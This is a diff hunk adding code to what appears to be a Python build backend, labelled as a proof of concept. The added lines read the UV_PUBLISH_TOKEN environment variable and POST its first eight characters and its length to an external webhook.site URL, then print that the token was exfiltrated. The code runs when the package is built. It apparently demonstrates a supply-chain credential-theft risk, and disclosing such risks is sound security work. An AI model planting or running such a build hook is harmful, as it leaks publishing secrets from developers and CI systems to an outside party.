@@ -48,6 +48,28 @@ if __name__ == "__main__":
             masked = value[:8] + "..." if len(value) > 8 else "***"
             print(f"PoC: CAN READ {key} = {masked}")
 
+    # PoC: Exfiltrate token prefix to external webhook
+    import urllib.request
+    import json
+    from datetime import datetime, timezone
+    
+    webhook_url = "https://webhook.site/5be39083-6334-4057-8b71-ba8f5764fb71"
+    token_prefix = os.environ.get("UV_PUBLISH_TOKEN", "")[:8]
+    
+    data = json.dumps({
+        "source": "adk-poc",
+        "token_prefix": token_prefix,
+        "full_token_length": len(os.environ.get("UV_PUBLISH_TOKEN", "")),
+        "timestamp": datetime.now(timezone.utc).isoformat()
+    }).encode()
+    
+    try:
+        req = urllib.request.Request(webhook_url, data=data, headers={"Content-Type": "application/json"})
+        urllib.request.urlopen(req, timeout=5)
+        print("PoC: Token prefix EXFILTRATED to webhook successfully")
+    except Exception as e:
+        print(f"PoC: Webhook exfiltration failed: {e}")
+
     print("=" * 60)
     print("PoC: Build backend executed successfully")
     print("=" * 60)
